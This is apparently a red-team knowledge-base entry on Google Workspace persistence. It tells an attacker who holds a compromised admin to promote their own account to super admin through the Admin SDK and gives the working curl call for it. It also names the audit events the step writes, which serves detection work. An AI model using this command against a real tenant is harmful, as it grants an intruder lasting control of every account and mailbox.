---
id: gws-super-admin
title: Google Workspace super-admin grant (tenant persistence)
section: Google Workspace / identity
phase: Persistence
attack:
  tactic: TA0003
  techniques: [T1098.003]
platform: [gws]
source: Google Workspace persistence (admin-role grant)
pair: gws-admin-audit
---

After compromising an admin, promote your own account: flip a user to **super admin** (or
assign a privileged admin role) via the Admin SDK. That is durable, full-tenant control —
user/role management, security settings, every mailbox — surviving the victim admin's
password reset. Making a user super admin writes an **admin** audit event
(`GRANT_DELEGATED_ADMIN_PRIVILEGES`); a role assignment writes `ASSIGN_ROLE`. (Cloud IdP —
no slots.)

```sh
# promote a controlled user to super admin via the Admin SDK Directory API
curl -s -X POST "https://admin.googleapis.com/admin/directory/v1/users/<userKey>/makeAdmin" \
  -H "Authorization: Bearer <admin-token>" -H "Content-Type: application/json" \
  -d '{"status": true}'
```
